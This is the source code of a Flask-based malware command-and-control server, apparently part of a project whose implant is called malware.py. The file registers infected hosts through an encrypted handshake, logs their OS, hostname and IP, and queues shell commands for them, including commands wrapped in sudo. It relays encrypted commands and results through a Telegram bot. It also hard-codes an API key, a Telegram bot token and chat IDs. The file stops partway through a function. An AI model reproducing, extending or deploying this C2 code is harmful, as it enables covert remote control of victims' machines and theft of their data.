import sys
import os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from flask import Flask, request, jsonify, Response
from flask_cors import CORS
import time
import requests
import json
import base64
import subprocess
import os
import logging
import sqlite3
import csv
import io
import socket
import platform
import threading
from datetime import datetime
from functools import wraps
from collections import defaultdict, deque
from Crypto.Cipher import AES as _AES_MOD
from Crypto.PublicKey import RSA as _RSA_MOD
from Crypto.Cipher import PKCS1_OAEP as _PKCS1_MOD
from modules.encryption import (
    hybrid_decrypt_first_message,
    hybrid_encrypt,
    hybrid_decrypt,
    aes_encrypt,
    aes_decrypt
)
from modules.c2_telegram_ids import resolve_c2_chats, DEFAULT_GROUP, DEFAULT_CHANNEL

app = Flask(__name__)

# ======================== تفعيل CORS ========================
CORS(app)

# ======================== إعداد نظام التسجيل (Logging) ========================
if not os.path.exists('logs'):
    os.makedirs('logs')

log_filename = f'logs/c2_server_{datetime.now().strftime("%Y%m%d")}.log'

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(log_filename),
        logging.StreamHandler()
    ]
)

logger = logging.getLogger(__name__)

# ======================== إعدادات الأمان ========================
API_KEY = "c2_super_secret_key_2026_123456"
# Dashboard traffic arrives from 127.0.0.1 (Flask proxy), so ALL users share
# one bucket. 120/min = 2 req/s gives comfortable headroom for polling + actions.
RATE_LIMIT_REQUESTS = 120
RATE_LIMIT_WINDOW = 60

rate_limits = defaultdict(list)

def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get('X-API-Key')
        if token != API_KEY:
            logger.warning(f"Unauthorized access attempt from {request.remote_addr}")
            return jsonify({"error": "Unauthorized", "message": "Invalid API Key"}), 401
        return f(*args, **kwargs)
    return decorated

def rate_limit(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        ip = request.remote_addr
        now = time.time()

        rate_limits[ip] = [t for t in rate_limits[ip] if now - t < RATE_LIMIT_WINDOW]

        if len(rate_limits[ip]) >= RATE_LIMIT_REQUESTS:
            logger.warning(f"Rate limit exceeded for {ip}")
            return jsonify({"error": "Rate limit exceeded"}), 429

        rate_limits[ip].append(now)
        return f(*args, **kwargs)
    return decorated

# ======================== إعداد قاعدة البيانات ========================
DB_PATH = 'c2_database.db'

def init_db():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS clients (
            id TEXT PRIMARY KEY,
            last_seen REAL,
            os TEXT,
            hostname TEXT,
            ip_address TEXT
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp REAL,
            type TEXT,
            data TEXT,
            client_id TEXT,
            chat_id TEXT
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            command TEXT,
            client_id TEXT,
            status TEXT,
            result TEXT,
            created_at REAL,
            executed_at REAL,
            cwd TEXT
        )
    ''')

    conn.commit()

    # ── Migrations: add missing columns to existing tables ──
    existing = {row[1] for row in cursor.execute("PRAGMA table_info(commands)")}
    for col, definition in [("result", "TEXT"), ("executed_at", "REAL"), ("cwd", "TEXT")]:
        if col not in existing:
            cursor.execute(f"ALTER TABLE commands ADD COLUMN {col} {definition}")
            logger.info(f"🔧 Migration: added commands.{col}")

    conn.commit()
    conn.close()
    logger.info("✅ Database initialized")

def save_log_to_db(timestamp, log_type, data, client_id=None, chat_id=None):
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO logs (timestamp, type, data, client_id, chat_id)
            VALUES (?, ?, ?, ?, ?)
        ''', (timestamp, log_type, data, client_id, chat_id))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Failed to save log to DB: {e}")

def save_client_to_db(client_id, last_seen, os_info=None, hostname=None, ip=None):
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT OR REPLACE INTO clients (id, last_seen, os, hostname, ip_address)
            VALUES (?, ?, ?, ?, ?)
        ''', (client_id, last_seen, os_info, hostname, ip))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Failed to save client to DB: {e}")

def save_command_to_db(command, client_id, status="pending", cwd=None):
    """Save command to DB and return the inserted row ID."""
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO commands (command, client_id, status, created_at, cwd)
            VALUES (?, ?, ?, ?, ?)
        ''', (command, client_id, status, time.time(), cwd))
        row_id = cursor.lastrowid
        conn.commit()
        conn.close()
        return row_id
    except Exception as e:
        logger.error(f"Failed to save command to DB: {e}")
        return None

def load_data_from_db():
    global clients, clients_data, commands
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()

        cursor.execute('SELECT id, last_seen, os, hostname, ip_address FROM clients')
        for row in cursor.fetchall():
            clients[row[0]] = {
                "last_seen": row[1],
                "os": row[2] or "",
                "hostname": row[3] or "",
                "ip": row[4] or "",
            }

        cursor.execute('SELECT timestamp, type, data, client_id, chat_id FROM logs ORDER BY id DESC LIMIT 1000')
        for row in cursor.fetchall():
            log_entry = {
                "timestamp": row[0],
                "type": row[1],
                "data": row[2]
            }
            if row[3]:
                log_entry["client_id"] = row[3]
            if row[4]:
                log_entry["chat_id"] = row[4]
            clients_data.append(log_entry)

        cursor.execute('SELECT id, command, client_id FROM commands WHERE status = "pending"')
        for row in cursor.fetchall():
            commands.append({"id": row[0], "cmd": row[1]})

        conn.close()
        logger.info(f"📦 Loaded {len(clients)} clients, {len(clients_data)} logs, {len(commands)} commands from DB")
    except Exception as e:
        logger.error(f"Failed to load data from DB: {e}")

# ======================== البيانات في الذاكرة ========================
sessions = {}
clients_data = []
clients = {}
commands = []

# ======================== إعدادات السيرفر ========================
SERVER_CONFIG_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'server_config.json')
SUDO_PASSWORD = ""

def _load_server_config():
    global SUDO_PASSWORD
    if os.path.exists(SERVER_CONFIG_PATH):
        try:
            with open(SERVER_CONFIG_PATH, 'r', encoding='utf-8') as f:
                cfg = json.load(f)
            SUDO_PASSWORD = cfg.get('sudo_password', '')
            logger.info("✅ Server config loaded")
        except Exception as e:
            logger.error(f"Failed to load server config: {e}")

def _save_server_config():
    try:
        with open(SERVER_CONFIG_PATH, 'w', encoding='utf-8') as f:
            json.dump({'sudo_password': SUDO_PASSWORD}, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logger.error(f"Failed to save server config: {e}")

_load_server_config()

# ======================== حالة الـ shell على جهاز Flask (تحميل / تنزيل من الداش فقط) ========================
C2_CWD  = os.path.expanduser("~")
C2_USER = os.environ.get('USER', os.environ.get('LOGNAME', os.environ.get('USERNAME', 'user')))

def _format_cwd_display(cwd: str) -> str:
    """Replace home prefix with ~ for display."""
    home = os.path.expanduser("~")
    if cwd == home:
        return "~"
    if cwd.startswith(home + "/"):
        return "~" + cwd[len(home):]
    return cwd

# ======================== إعدادات Telegram ========================
TELEGRAM_CONFIG_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'telegram_config.json')

_DEFAULT_TOKEN    = "8782474352:AAEK1FCeLrNMqnGXPLgLJfJQ1qmiHV9i9d4"
_DEFAULT_CHATS    = ["7604675763", "-1002470378114", "-1002426552780"]

TOKEN     = _DEFAULT_TOKEN
ALL_CHATS = list(_DEFAULT_CHATS)
C2_GROUP_ID = DEFAULT_GROUP
C2_CHANNEL_ID = DEFAULT_CHANNEL
C2_BOT_TOKEN = (_DEFAULT_TOKEN or "").strip()

def _load_telegram_config():
    global TOKEN, ALL_CHATS, C2_GROUP_ID, C2_CHANNEL_ID, C2_BOT_TOKEN
    cfg: dict = {}
    if os.path.exists(TELEGRAM_CONFIG_PATH):
        try:
            with open(TELEGRAM_CONFIG_PATH, 'r', encoding='utf-8') as f:
                cfg = json.load(f)
            TOKEN     = cfg.get('token', _DEFAULT_TOKEN) or _DEFAULT_TOKEN
            ALL_CHATS = cfg.get('chat_ids', _DEFAULT_CHATS) or []
            logger.info(f"✅ Telegram config loaded — chats: {ALL_CHATS}")
        except Exception as e:
            logger.error(f"Failed to load telegram config: {e}")
    merged = {**cfg, "chat_ids": ALL_CHATS}
    C2_GROUP_ID, C2_CHANNEL_ID = resolve_c2_chats(merged)
    C2_BOT_TOKEN = (TOKEN or _DEFAULT_TOKEN).strip()
    logger.info(f"📍 C2 Telegram — group: {C2_GROUP_ID}  channel: {C2_CHANNEL_ID}")

def _save_telegram_config():
    try:
        existing: dict = {}
        if os.path.exists(TELEGRAM_CONFIG_PATH):
            try:
                with open(TELEGRAM_CONFIG_PATH, 'r', encoding='utf-8') as f:
                    existing = json.load(f)
            except Exception:
                existing = {}
        existing['token'] = TOKEN
        existing['chat_ids'] = ALL_CHATS
        existing['c2_group_id'] = C2_GROUP_ID
        existing['c2_channel_id'] = C2_CHANNEL_ID
        with open(TELEGRAM_CONFIG_PATH, 'w', encoding='utf-8') as f:
            json.dump(existing, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logger.error(f"Failed to save telegram config: {e}")

_load_telegram_config()

# كلاينت متصلين عبر Telegram وجلساتهم بمفاتيح AES-GCM
telegram_clients: set = set()
tg_sessions: dict = {}
_tg_last_update_id = 0

# بدون تحديث last_seen (heartbeat / أوامر) يُعتبر الكلاينت منقطعاً ويُزال من الداش
CLIENT_OFFLINE_AFTER_SEC = int(os.environ.get("CLIENT_OFFLINE_AFTER_SEC", "120"))

# رسائل موجهة لكل عميل (PUBLIC_KEY / HANDSHAKE_OK / CMD) — يَسحبها malware.py عبر HTTP
# حتى لا يتنافس عدة عملاء على نفس getUpdates لبوت واحد.
MALWARE_PULL_SECRET = os.environ.get("MALWARE_PULL_SECRET", "c2_malware_pull_default_change_me")
malware_downlink: dict = defaultdict(lambda: deque(maxlen=64))


def _malware_downlink_push(client_id: str, line: str) -> None:
    cid = (client_id or "").strip()
    if not cid or not line:
        return
    malware_downlink[cid].append(line)

# ── دوال مساعدة للتيليجرام ──────────────────────────────────────────────────

def _tg_send_to_channel(message: str):
    """المالوير يقرأ الأوامر والردود من الجروب فقط — نرسل إلى GROUP_ID."""
    if message.startswith("CMD:"):
        try:
            cid = message.split(":", 2)[1].strip()
            _malware_downlink_push(cid, message)
        except Exception:
            pass
    url = f"https://api.telegram.org/bot{C2_BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": C2_GROUP_ID, "text": message}, timeout=8)
    except Exception as e:
        logger.error(f"TG send error (group): {e}")

def _tg_decrypt_first_message(encrypted_key_b64: str, encrypted_data_b64: str):
    """RSA فك تشفير مفتاح AES، ثم AES-GCM فك تشفير البيانات (مطابق لما يستخدمه malware.py)"""
    from modules.encryption import _load_private_key
    private_key = _load_private_key()
    cipher_rsa = _PKCS1_MOD.new(private_key)
    aes_key = cipher_rsa.decrypt(base64.b64decode(encrypted_key_b64))

    raw = base64.b64decode(encrypted_data_b64)
    nonce, tag, ciphertext = raw[:16], raw[16:32], raw[32:]
    cipher_aes = _AES_MOD.new(aes_key, _AES_MOD.MODE_GCM, nonce=nonce)
    plaintext = cipher_aes.decrypt_and_verify(ciphertext, tag)
    return plaintext.decode(), aes_key

def _tg_encrypt(aes_key: bytes, plaintext: str) -> str:
    """AES-GCM تشفير للأوامر المرسلة للمالوير"""
    cipher = _AES_MOD.new(aes_key, _AES_MOD.MODE_GCM)
    ciphertext, tag = cipher.encrypt_and_digest(plaintext.encode())
    return base64.b64encode(cipher.nonce + tag + ciphertext).decode()

def _tg_decrypt(aes_key: bytes, encrypted_b64: str) -> str:
    """AES-GCM فك تشفير الرسائل القادمة من المالوير"""
    raw = base64.b64decode(encrypted_b64)
    nonce, tag, ciphertext = raw[:16], raw[16:32], raw[32:]
    cipher = _AES_MOD.new(aes_key, _AES_MOD.MODE_GCM, nonce=nonce)
    return cipher.decrypt_and_verify(ciphertext, tag).decode()

def listen_telegram_group():
    """خيط في الخلفية - يستقبل رسائل المالوير من الجروب ويسجلهم في الداش"""
    global _tg_last_update_id

    # تحميل وتصدير المفتاح العام RSA للإرسال عبر Telegram
    from modules.encryption import _ensure_keys, _PUBLIC_KEY_PATH
    _ensure_keys()
    with open(_PUBLIC_KEY_PATH, 'rb') as _f:
        _rsa_pub_b64 = base64.b64encode(_f.read()).decode()

    logger.info("📡 Telegram C2 listener started")

    while True:
        try:
            url = f"https://api.telegram.org/bot{C2_BOT_TOKEN}/getUpdates"
            params = {"offset": _tg_last_update_id + 1, "timeout": 5}   # 5s لتقليل التأخير
            response = requests.get(url, params=params, timeout=10)

            if response.status_code == 200:
                data = response.json()
                if data.get("ok"):
                    for update in data["result"]:
                        _tg_last_update_id = update["update_id"]

                        if "message" not in update or "text" not in update["message"]:
                            continue

                        msg     = update["message"]
                        chat_id = str(msg["chat"]["id"])
                        text    = msg["text"]

                        if chat_id != C2_GROUP_ID:
                            continue

                        # ── 1️⃣ طلب المفتاح العام ──────────────────────────────
                        if text.startswith("KEY_REQUEST:"):
                            client_id = text.split(":", 1)[1].strip()
                            logger.info(f"🔑 TG Key request from {client_id}")
                            _tg_send_to_channel(f"PUBLIC_KEY:{client_id}:{_rsa_pub_b64}")

                        # ── 2️⃣ الهاندشيك ──────────────────────────────────────
                        elif text.startswith("HANDSHAKE:"):
                            try:
                                parts = text.split(":", 2)
                                if len(parts) < 3:
                                    continue
                                client_id      = parts[1]
                                key_part, data_part = parts[2].split("|", 1)

                                decrypted_info, aes_key_bytes = _tg_decrypt_first_message(key_part, data_part)
                                info = json.loads(decrypted_info)

                                tg_sessions[client_id]  = aes_key_bytes
                                sessions[client_id]     = aes_key_bytes
                                telegram_clients.add(client_id)

                                clients[client_id] = {
                                    "last_seen": time.time(),
                                    "os":        info.get("os", ""),
                                    "hostname":  info.get("hostname", ""),
                                    "ip":        info.get("ip", ""),
                                    "via":       "telegram",
                                }
                                save_client_to_db(
                                    client_id, time.time(),
                                    os_info=info.get("os"),
                                    hostname=info.get("hostname"),
                                    ip=info.get("ip"),
                                )
                                save_log_to_db(time.time(), "handshake", decrypted_info, client_id)

                                logger.info(
                                    f"✅ TG Handshake OK: {client_id} "
                                    f"— OS: {info.get('os')} IP: {info.get('ip')}"
                                )
                                _tg_send_to_channel(f"HANDSHAKE_OK:{client_id}")

                            except Exception as e:
                                logger.error(f"TG Handshake error: {e}")

                        # ── 3️⃣ نتائج الأوامر ──────────────────────────────────
                        elif text.startswith("RESULT:"):
                            try:
                                parts = text.split(":", 2)
                                if len(parts) < 3:
                                    continue
                                client_id        = parts[1]
                                encrypted_result = parts[2]

                                if client_id not in tg_sessions:
                                    continue

                                decrypted  = _tg_decrypt(tg_sessions[client_id], encrypted_result)
                                result_obj = json.loads(decrypted)
                                cmd_text   = result_obj.get("command", "")
                                result_txt = result_obj.get("result", "")
                                cmd_cwd    = result_obj.get("cwd")

                                # تحديث أقدم أمر pending لهذا الكلاينت، وإلا نُنشئ سجلاً جديداً
                                try:
                                    conn = sqlite3.connect(DB_PATH)
                                    row = conn.execute(
                                        'SELECT id FROM commands WHERE client_id=? AND status="pending" '
                                        'ORDER BY created_at ASC LIMIT 1',
                                        (client_id,)
                                    ).fetchone()
                                    if row:
                                        conn.execute(
                                            'UPDATE commands SET status="done", result=?, executed_at=?, cwd=? WHERE id=?',
                                            (result_txt, time.time(), cmd_cwd, row[0])
                                        )
                                    else:
                                        conn.execute(
                                            'INSERT INTO commands (command, client_id, status, result, created_at, executed_at, cwd) '
                                            'VALUES (?,?,?,?,?,?,?)',
                                            (cmd_text, client_id, "done", result_txt, time.time(), time.time(), cmd_cwd)
                                        )
                                    conn.commit()
                                    conn.close()
                                except Exception as db_err:
                                    logger.error(f"TG result DB error: {db_err}")

                                save_log_to_db(time.time(), "result", decrypted, client_id)
                                logger.info(f"📥 TG Result from {client_id}: {cmd_text[:60]}")

                            except Exception as e:
                                logger.error(f"TG Result error: {e}")

                        # ── 4️⃣ Heartbeat ──────────────────────────────────────
                        elif text.startswith("HEARTBEAT:"):
                            try:
                                parts = text.split(":", 2)
                                if len(parts) >= 3 and parts[1] in tg_sessions:
                                    client_id = parts[1]
                                    _tg_decrypt(tg_sessions[client_id], parts[2])
                                    if client_id in clients:
                                        clients[client_id]["last_seen"] = time.time()
                                        save_client_to_db(client_id, time.time())
                                    logger.debug(f"💓 TG Heartbeat from {client_id}")
                            except Exception:
                                pass

                    time.sleep(0.1)

        except Exception as e:
            logger.error(f"TG listen error: {e}")
            time.sleep(5)

# ======================== دوال مساعدة ========================
def check_bot_status():
    try:
        result = subprocess.run(["pgrep", "-f", "bot.py"], capture_output=True, text=True)
        return "running" if result.stdout.strip() else "stopped"
    except:
        return "unknown"

# ======================== 0a. معالجة رسائل التيليجرام الداخلية ========================
@app.route("/internal/tg_message", methods=["POST"])
@require_auth
def process_tg_message():
    """
    يُستدعى من bot.py عندما يستقبل رسالة من الجروب تخص المالوير.
    يعالج: KEY_REQUEST / HANDSHAKE / RESULT / HEARTBEAT
    ويرجع { "reply": "..." } لو محتاج bot.py يبعت رد للقناة.
    """
    text  = (request.json or {}).get("text", "")
    reply = None

    # ── 1️⃣ طلب المفتاح العام ─────────────────────────────────────────
    if text.startswith("KEY_REQUEST:"):
        client_id = text.split(":", 1)[1].strip()
        logger.info(f"🔑 TG Key request from {client_id}")
        try:
            from modules.encryption import _ensure_keys, _PUBLIC_KEY_PATH
            _ensure_keys()
            with open(_PUBLIC_KEY_PATH, 'rb') as f:
                rsa_pub_b64 = base64.b64encode(f.read()).decode()
            reply = f"PUBLIC_KEY:{client_id}:{rsa_pub_b64}"
            _malware_downlink_push(client_id, reply)
        except Exception as e:
            logger.error(f"TG Key error: {e}")

    # ── 2️⃣ الهاندشيك ─────────────────────────────────────────────────
    elif text.startswith("HANDSHAKE:"):
        try:
            parts = text.split(":", 2)
            if len(parts) >= 3:
                client_id = parts[1].strip()
                key_part, data_part = parts[2].split("|", 1)
                decrypted_info, aes_key_bytes = _tg_decrypt_first_message(key_part, data_part)
                info = json.loads(decrypted_info)

                tg_sessions[client_id] = aes_key_bytes
                sessions[client_id]    = aes_key_bytes
                telegram_clients.add(client_id)
                clients[client_id] = {
                    "last_seen": time.time(),
                    "os":        info.get("os", ""),
                    "hostname":  info.get("hostname", ""),
                    "ip":        info.get("ip", ""),
                    "via":       "telegram",
                }
                save_client_to_db(
                    client_id, time.time(),
                    os_info=info.get("os"),
                    hostname=info.get("hostname"),
                    ip=info.get("ip"),
                )
                save_log_to_db(time.time(), "handshake", decrypted_info, client_id)
                logger.info(f"✅ TG Handshake OK: {client_id} — OS: {info.get('os')} IP: {info.get('ip')}")
                reply = f"HANDSHAKE_OK:{client_id}"
                _malware_downlink_push(client_id, reply)
        except Exception as e:
            logger.error(f"TG Handshake error: {e}")

    # ── 3️⃣ نتائج الأوامر ─────────────────────────────────────────────
    elif text.startswith("RESULT:"):
        try:
            parts = text.split(":", 2)
            if len(parts) >= 3:
                client_id = parts[1].strip()
                if client_id in tg_sessions:
                    decrypted  = _tg_decrypt(tg_sessions[client_id], parts[2])
                    result_obj = json.loads(decrypted)
                    cmd_text   = result_obj.get("command", "")
                    result_txt = result_obj.get("result", "")
                    cmd_cwd    = result_obj.get("cwd")

                    try:
                        conn = sqlite3.connect(DB_PATH)
                        row = conn.execute(
                            'SELECT id FROM commands WHERE client_id=? AND status="pending" '
                            'ORDER BY created_at ASC LIMIT 1',
                            (client_id,)
                        ).fetchone()
                        if row:
                            conn.execute(
                                'UPDATE commands SET status="done", result=?, executed_at=?, cwd=? WHERE id=?',
                                (result_txt, time.time(), cmd_cwd, row[0])
                            )
                        else:
                            conn.execute(
                                'INSERT INTO commands (command, client_id, status, result, created_at, executed_at, cwd) '
                                'VALUES (?,?,?,?,?,?,?)',
                                (cmd_text, client_id, "done", result_txt, time.time(), time.time(), cmd_cwd)
                            )
                        conn.commit()
                        conn.close()
                    except Exception as db_err:
                        logger.error(f"TG result DB error: {db_err}")

                    if client_id in clients:
                        clients[client_id]["last_seen"] = time.time()
                    save_log_to_db(time.time(), "result", decrypted, client_id)
                    logger.info(f"📥 TG Result from {client_id}: {cmd_text[:60]}")
        except Exception as e:
            logger.error(f"TG Result error: {e}")

    # ── 4️⃣ Heartbeat ─────────────────────────────────────────────────
    elif text.startswith("HEARTBEAT:"):
        try:
            parts = text.split(":", 2)
            if len(parts) >= 3 and parts[1].strip() in tg_sessions:
                client_id = parts[1].strip()
                _tg_decrypt(tg_sessions[client_id], parts[2])
                if client_id in clients:
                    clients[client_id]["last_seen"] = time.time()
                    save_client_to_db(client_id, time.time())
        except Exception:
            pass

    return jsonify({"reply": reply})


@app.route("/malware_pull", methods=["GET"])
def malware_pull():
    """
    كل عميل يسحب رسائله الخاصة فقط (نفس نص الجروب في التيليجرام).
    Header: X-Malware-Pull-Secret — يجب أن يطابق MALWARE_PULL_SECRET على السيرفر.
    Query: client_id
    ملاحظة: لا يُستخدم rate_limit هنا — عدة عملاء خلف نفس الـ NAT يشاركون IP السيرفر
    وكانوا يصلون إلى 429 ولا يستلمون PUBLIC_KEY فلا يُرسل الهاندشيك.
    """
    if request.headers.get("X-Malware-Pull-Secret", "") != MALWARE_PULL_SECRET:
        return jsonify({"error": "Unauthorized"}), 401
    client_id = request.args.get("client_id", "").strip()
    if not client_id:
        return jsonify({"error": "client_id required"}), 400
    q = malware_downlink.get(client_id)
    msgs = []
    if q:
        while q:
            msgs.append(q.popleft())
    return jsonify({"messages": msgs})


# ======================== 0. المفتاح العام RSA ========================
@app.route("/public_key", methods=["GET"])
def get_public_key():
    """إرسال المفتاح العام RSA للكلاينت لبدء عملية الهاندشيك"""
    try:
        from modules.encryption import _ensure_keys, _PUBLIC_KEY_PATH
        _ensure_keys()
        with open(_PUBLIC_KEY_PATH, 'rb') as f:
            key_bytes = f.read()
        return jsonify({"public_key": base64.b64encode(key_bytes).decode()})
    except Exception as e:
        logger.error(f"Failed to load public key: {e}")
        return jsonify({"error": "Failed to load public key"}), 500

# ======================== 1. Handshake ========================
@app.route("/handshake", methods=["POST"])
@rate_limit
def handshake():
    data = request.json
    encrypted_key = data.get("encrypted_key")
    encrypted_data = data.get("encrypted_data")
    client_id = data.get("client_id")

    logger.info(f"🟡 Handshake request from client: {client_id}")

    try:
        decrypted_data, aes_key = hybrid_decrypt_first_message(encrypted_key, encrypted_data)
        info = json.loads(decrypted_data)

        sessions[client_id] = aes_key
        clients[client_id] = {
            "last_seen": time.time(),
            "os": info.get("os", ""),
            "hostname": info.get("hostname", ""),
            "ip": info.get("ip", ""),
        }
        save_client_to_db(
            client_id, time.time(),
            os_info=info.get("os"),
            hostname=info.get("hostname"),
            ip=info.get("ip"),
        )

        clients_data.append(info)
        save_log_to_db(time.time(), "handshake", decrypted_data, client_id)

        logger.info(f"✅ Handshake successful with {client_id} — OS: {info.get('os')} IP: {info.get('ip')}")
        return jsonify({"status": "success"})
    except Exception as e:
        logger.error(f"❌ Handshake failed with {client_id}: {e}")
        return jsonify({"status": "failed"}), 400

# ======================== 2. استقبال البيانات ========================
@app.route("/data", methods=["POST"])
@rate_limit
def receive_data():
    data = request.json
    client_id = data.get("client_id")
    encrypted_data = data.get("encrypted_data")

    if client_id == "telegram":
        try:
            from modules.crypto_utils import decrypt_data
            raw = base64.b64decode(encrypted_data)
            decrypted_text = decrypt_data(raw).decode('utf-8')

            result = {
                "type": data.get("type"),
                "data": decrypted_text,
                "chat_id": data.get("chat_id")
            }

            logger.info(f"📱 Telegram message: {decrypted_text}")
            clients_data.append(result)
            save_log_to_db(time.time(), "telegram", decrypted_text, chat_id=data.get('chat_id'))
            return "OK"
        except Exception as e:
            logger.error(f"Telegram Decrypt Error: {e}")
            return "Error", 400

    if client_id not in sessions:
        test_prefixes = ("test_", "stress_test", "Test", "kali", "agent")
        if client_id.startswith(test_prefixes) or client_id in ["test_client", "kali", "agent1"]:
            sessions[client_id] = None
            clients[client_id] = {"last_seen": time.time()}
            save_client_to_db(client_id, time.time())
            logger.info(f"📝 Test client auto-registered: {client_id}")
        else:
            logger.warning(f"⚠️ No session for {client_id}")
            return "No session, need handshake", 401

    try:
        if encrypted_data and sessions.get(client_id) and sessions[client_id] is not None:
            decrypted_str = hybrid_decrypt(sessions[client_id], encrypted_data)
            decrypted = json.loads(decrypted_str)
            logger.info(f"🔓 Decrypted from {client_id}: {decrypted}")
            clients_data.append(decrypted)
            save_log_to_db(time.time(), "decrypted", decrypted_str, client_id)
        else:
            decrypted = data
            logger.info(f"📄 Plain from {client_id}: {decrypted}")
            clients_data.append(decrypted)
            save_log_to_db(time.time(), "plain", json.dumps(decrypted), client_id)

        if client_id in clients:
            clients[client_id]["last_seen"] = time.time()
            save_client_to_db(client_id, time.time())

        return "OK"
    except Exception as e:
        logger.error(f"Decryption error: {e}")
        return "Decryption failed", 400

# ======================== 3. استقبال الأوامر ========================
@app.route("/command", methods=["POST"])
@rate_limit
@require_auth
def receive_command():
    data = request.json
    cmd       = data.get("command", "").strip()
    client_id = data.get("client_id", "all")
    use_sudo  = bool(data.get("sudo", False))

    logger.warning(f"💀 Command received: {cmd} for {client_id} (sudo={use_sudo})")

    # لو [C2-Server] عنده session تيليجرام (malware.py على السيرفر) → يبعت عبر Telegram
    if client_id == "[C2-Server]" and "[C2-Server]" in tg_sessions:
        row_id = save_command_to_db(cmd, client_id)
        final_cmd = f"sudo -n bash -c '{cmd}'" if use_sudo else cmd
        _tg_send_to_channel(f"CMD:[C2-Server]:{_tg_encrypt(tg_sessions['[C2-Server]'], final_cmd)}")
        logger.info(f"📤 TG Command → [C2-Server]: {cmd}")
        return jsonify({"status": "sent_via_telegram", "command_id": row_id})

    # لا تنفيذ محلي — [C2-Server] يعمل فقط عبر عميل Telegram على نفس الجهاز
    if client_id == "[C2-Server]":
        logger.warning("[C2-Server] rejected — malware agent not connected (Telegram)")
        return jsonify({
            "error": "agent_offline",
            "message": "[C2-Server] requires malware.py on this machine with MALWARE_CLIENT_ID=[C2-Server] (included in ./start_all.sh).",
        }), 503

    final_cmd = f"sudo -n bash -c '{cmd}'" if use_sudo else cmd

    # كلاينت تيليجرام - يُرسل الأمر عبر قناة Telegram مشفراً
    if client_id == "all":
        row_id = save_command_to_db(cmd, client_id)
        for tg_cid in list(telegram_clients):
            if tg_cid in tg_sessions:
                _tg_send_to_channel(f"CMD:{tg_cid}:{_tg_encrypt(tg_sessions[tg_cid], final_cmd)}")
        # HTTP clients يستقبلون عبر queue كالعادة
        http_clients = [c for c in clients if c not in telegram_clients]
        if http_clients:
            commands.append({"cmd": final_cmd, "id": row_id, "client_id": client_id})
        logger.info(f"📤 Command sent to all ({len(telegram_clients)} TG + {len(http_clients)} HTTP)")
        return jsonify({"status": "sent", "command_id": row_id})

    if client_id in telegram_clients:
        if client_id not in tg_sessions:
            return jsonify({"error": "No TG session for this client"}), 400
        row_id = save_command_to_db(cmd, client_id)
        _tg_send_to_channel(f"CMD:{client_id}:{_tg_encrypt(tg_sessions[client_id], final_cmd)}")
        logger.info(f"📤 TG Command sent to {client_id}: {cmd}")
        return jsonify({"status": "sent_via_telegram", "command_id": row_id})

    # Regular HTTP clients
    row_id = save_command_to_db(cmd, client_id)
    commands.append({"cmd": final_cmd, "id": row_id, "client_id": client_id})
    return jsonify({"status": "queued", "command_id": row_id})

# ======================== 4. سحب الأوامر ========================
@app.route("/get_command", methods=["GET"])
@rate_limit
def get_command():
    client_id = request.args.get("client_id", "").strip()

    for i, entry in enumerate(commands):
        # Match by client_id if provided, otherwise serve any untagged command
        if isinstance(entry, dict):
            entry_cid = entry.get("client_id", "")
            # Serve if: no client_id filter, OR entry targets "all", OR exact match
            if client_id and entry_cid and entry_cid != "all" and entry_cid != client_id:
                continue
            cmd_text = entry.get("cmd", "")
            cmd_id   = entry.get("id")
        else:
            cmd_text = entry
            cmd_id   = None

        commands.pop(i)
        logger.info(f"📤 Command dispatched to '{client_id or 'any'}': {cmd_text} (id={cmd_id})")
        return jsonify({"command": cmd_text, "command_id": cmd_id})

    return jsonify({"command": None, "command_id": None})

# ======================== 5. إرسال أمر لجهاز معين ========================
@app.route("/send_command", methods=["POST"])
@rate_limit
@require_auth
def send_command():
    data = request.json
    client_id = data.get("client_id")
    command = data.get("command")

    if client_id not in sessions:
        return "No session", 401

    row_id = save_command_to_db(command, client_id)

    if sessions[client_id] is not None:
        encrypted_cmd = hybrid_encrypt(sessions[client_id], command)
        commands.append({"client_id": client_id, "encrypted_cmd": encrypted_cmd, "id": row_id})
    else:
        commands.append({"cmd": command, "id": row_id})

    logger.info(f"✅ Command stored for {client_id} (id={row_id})")
    return jsonify({"status": "stored", "command_id": row_id})

# ======================== 6. سحب أوامر مشفرة ========================
@app.route("/get_command_encrypted", methods=["POST"])
@rate_limit
def get_command_encrypted():
    data = request.json
    client_id = data.get("client_id")

    if client_id not in sessions:
        return jsonify({"command": None, "command_id": None})

    for i, entry in enumerate(commands):
        if isinstance(entry, dict) and entry.get("client_id") == client_id:
            commands.pop(i)
            return jsonify({
                "command":    entry.get("encrypted_cmd"),
                "command_id": entry.get("id"),
            })

    return jsonify({"command": None, "command_id": None})

# ======================== 7. عرض السجلات ========================
@app.route("/get", methods=["GET"])
@rate_limit
def get_data():
    return jsonify(clients_data)

# ======================== 8. عرض الأجهزة ========================
def _prune_offline_clients(now=None):
    """إزالة الكلاينت الذين لم يُحدَّث last_seen منذ أكثر من CLIENT_OFFLINE_AFTER_SEC."""
    now = now if now is not None else time.time()
    stale = []
    for cid, info in list(clients.items()):
        ls = info.get("last_seen")
        if ls is None:
            continue
